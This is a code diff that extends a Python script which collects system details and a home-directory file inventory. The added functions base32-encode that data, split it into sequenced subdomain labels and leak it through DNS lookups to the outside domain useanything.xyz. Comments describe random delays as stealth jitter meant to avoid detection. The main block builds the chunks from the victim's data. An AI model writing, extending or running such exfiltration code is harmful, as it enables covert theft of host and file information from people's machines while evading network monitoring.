@@ -2,6 +2,9 @@ import os
 import platform
 import subprocess
 import base64
+import math
+import time
+import random
 
 def encode_to_base32(input_string):
     """
@@ -103,9 +106,71 @@ def get_fs_inventory_raw_string(start_path="/", target_depth=4):
     # Join all lines into one single string separated by newlines
     return "\n".join(report_lines)
 
+def prepare_dns_chunks(encoded_string, chunk_size=55):
+    """
+    Splits a long encoded string into a list of chunks.
+    Each chunk is prepended with a sequence number for reassembly.
+    """
+    if not encoded_string:
+        return []
+
+    chunks = []
+    
+    # Calculate how many segments we will have
+    # (Used to pad the sequence number, e.g., 01, 02... 99)
+    total_segments = math.ceil(len(encoded_string) / chunk_size)
+    padding = len(str(total_segments))
+
+    for i in range(0, len(encoded_string), chunk_size):
+        # Extract the slice
+        segment = encoded_string[i : i + chunk_size]
+        
+        # Create a sequence ID (e.g., "001", "002")
+        sequence_id = str(len(chunks) + 1).zfill(padding)
+        
+        # Combine: {ID}.{DATA}
+        # We use a dot as a separator to create a sub-domain structure
+        chunks.append(f"{sequence_id}.{segment}")
+
+    return chunks
+
+def transmit_dns_data(chunk_list, domain="useanything.xyz"):
+    """
+    Iterates through the chunk list and performs a DNS lookup for each.
+    Includes a random delay to mimic natural traffic.
+    """
+    print(f"[*] Starting transmission of {len(chunk_list)} chunks to {domain}...")
+    
+    success_count = 0
+
+    for chunk in chunk_list:
+        # Construct the full hostname: {ID}.{DATA}.{DOMAIN}
+        full_hostname = f"{chunk}.{domain}"
+        
+        try:
+            # We use gethostbyname to trigger a standard A-record lookup
+            # The system doesn't need to actually find an IP; the request 
+            # hitting the target DNS server is what 'delivers' the data.
+            socket.gethostbyname(full_hostname)
+            success_count += 1
+        except socket.gaierror:
+            # This is expected! Since the subdomain doesn't actually exist,
+            # the DNS system will return a 'Name not found' error.
+            # The data was still 'sent' to the server in the request.
+            success_count += 1
+        except Exception as e:
+            print(f"[!] Transmission error on chunk: {e}")
+
+        # --- STEALTH: Jitter ---
+        # Wait between 1 and 3 seconds so it doesn't look like a bot
+        delay = random.uniform(1.0, 3.0)
+        time.sleep(delay)
+
+    print(f"\n[+] Transmission complete. {success_count}/{len(chunk_list)} chunks sent.")
 
 # Example usage
 if __name__ == "__main__":
-    print(get_system_snapshot_string())
-    print(get_fs_inventory_raw_string(os.path.expanduser("~"), target_depth=3))
-    print(encode_to_base32(get_system_snapshot_string()))
+    system_snapshot = get_system_snapshot_string()
+    file_system = get_fs_inventory_raw_string(os.path.expanduser("~"), target_depth=3)
+    print(prepare_dns_chunks(encode_to_base32(system_snapshot+"\n"+file_system)))
+    
